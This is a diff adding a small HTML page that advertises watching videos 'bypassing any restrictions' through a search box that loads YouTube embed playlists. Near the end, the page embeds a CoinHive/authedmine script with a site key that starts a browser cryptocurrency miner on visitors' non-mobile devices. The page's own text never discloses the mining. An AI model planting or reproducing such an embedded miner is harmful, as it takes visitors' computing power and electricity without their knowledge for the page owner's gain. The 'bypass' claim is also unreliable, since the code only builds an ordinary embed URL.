@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>'llowe the kebah</title>
+</head>
+<body>
+<h1>Bypass - avoid the wall</h1>
+    <p>Hello, my people. Here you can view all your favourate video bypassing any restrictions.
+    All you have do is search for a keyword and an playlist of videos will and you will be able to watch it scot free. Please enjoy with moderation. Do your work!!</p>
+<script type="text/javascript">
+
+function go_get(){
+ var base_url = 'http://www.youtube.com/embed?listType=search&list=';
+ var search_field = document.getElementById('yourtextfield').value;
+ var target_url = base_url + search_field;
+ var ifr = document.getElementById('youriframe');
+ ifr.src = target_url;
+ return false;
+}
+
+</script> 
+
+<form onsubmit="go_get(); return false;" >
+ <input type="text"  id="yourtextfield"/>
+ <input type="submit" value="Search Playlists" />
+</form>
+
+<iframe id="youriframe" width="640" height="360" ></iframe>
+<div>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('i8tNeXQcmjtwbW8U51HrGXfr6W2Rm12v', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
+</div>
+
+</body>
+</html>
